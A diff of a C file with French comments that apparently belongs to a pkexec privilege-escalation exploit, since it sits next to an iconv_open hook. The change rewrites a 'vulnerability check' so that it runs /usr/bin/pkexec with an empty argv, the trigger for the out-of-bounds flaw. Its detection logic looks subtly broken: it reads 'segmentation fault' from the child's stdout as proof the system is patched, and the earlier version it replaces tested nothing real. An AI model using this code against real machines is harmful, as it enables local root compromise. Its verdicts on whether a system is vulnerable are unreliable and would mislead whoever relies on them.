@@ -86,61 +86,40 @@ void iconv_open() {
 }
 
 void checkVulnerability() {
-   // Créer un pipe pour échanger des données entre le processus parent et le processus enfant.
-  pipe(pipefd);
+  // Exécuter pkexec en passant NULL comme argv pour tenter d'accéder hors limite.
+  int pipefd[2];
+  pid_t pid;
+  char * a_argv[] = { NULL };
+  char * a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
 
-  // Créer un second pipe pour lire les résultats de la détection de vulnérabilité
-  int result_pipefd[2];
-  if (pipe(result_pipefd) == -1) {
+  if (pipe(pipefd) < 0) {
     perror("pipe");
-    exit(EXIT_FAILURE);
-  }
-
-  // Processus enfant
-  if (fork() == 0) {
-    // Fermer l'extrémité d'écriture du pipe.
-    close(pipefd[1]);
-    // Lire les données du pipe dans le tampon buf.
-    read(pipefd[0], buf, sizeof(buf) - 1);
-    // Fermer l'extrémité de lecture du pipe.
-    close(pipefd[0]);
-
-    // Copier le descripteur d'écriture du second pipe dans le descripteur de sortie standard
-    if (dup2(result_pipefd[1], 1) == -1) {
-      perror("dup2");
-      exit(EXIT_FAILURE);
-    }
-
-    // Si la chaîne de caractères "pkexec --version" est présente au début
-    // du tampon buf, cela signifie que le système n'est pas vulnérable à l'exploit.
-    if (strstr(buf, "pkexec --version") != NULL) {
-      puts("System is not vulnerable");
-      exit(0);
-
-      // Sinon, cela signifie que le système est vulnérable à l'
-    } else {
-      puts("System vulnerable");
-    }
-    // Fin du processus Enfant
     exit(0);
   }
 
-  // Fermer l'extrémité de lecture du premier pipe et de l'extrémité d'écriture du second pipe dans le processus parent.
-  close(pipefd[0]);
-  close(result_pipefd[1]);
+  pid = fork();
+  if (pid == 0) {
+    // Dans le processus fils, fermer l'entrée du pipe et rediriger la sortie standard vers l'entrée du pipe.
+    close(pipefd[0]);
+    dup2(pipefd[1], 1);
 
-  // Écrire sur l'extrémité d'écriture du premier pipe.
-  write(pipefd[1], "pkexec --version", strlen("pkexec --version"));
+    // Exécuter pkexec en passant NULL comme argv.
+    execve("/usr/bin/pkexec", a_argv, a_envp);
+    exit(0);
+  } else if (pid > 0) {
+    // Dans le processus parent, fermer la sortie du pipe et lire la sortie standard du processus fils depuis l'entrée du pipe.
+    close(pipefd[1]);
+    read(pipefd[0], buf, sizeof(buf));
 
-  // Fermer l'extrémité d'écriture du premier pipe.
-  close(pipefd[1]);
-
-  // Lire les résultats de la détection de vulnérabilité à partir du second pipe.
-  char buffer[256];
-  ssize_t num_read = read(result_pipefd[0], buffer, sizeof(buffer));
-  if (num_read == -1) {
-    perror("read");
-    exit(EXIT_FAILURE);
+    // Vérifier si la sortie standard contient une erreur d'accès hors limite.
+    if (strstr(buf, "segmentation fault") != NULL) {
+      // Si oui, la faille a été corrigée.
+      printf("Le système n'est pas vulnérable\n");
+      exit(0);
+    }
+  } else {
+    perror("fork");
+    exit(0);
   }
 }
 
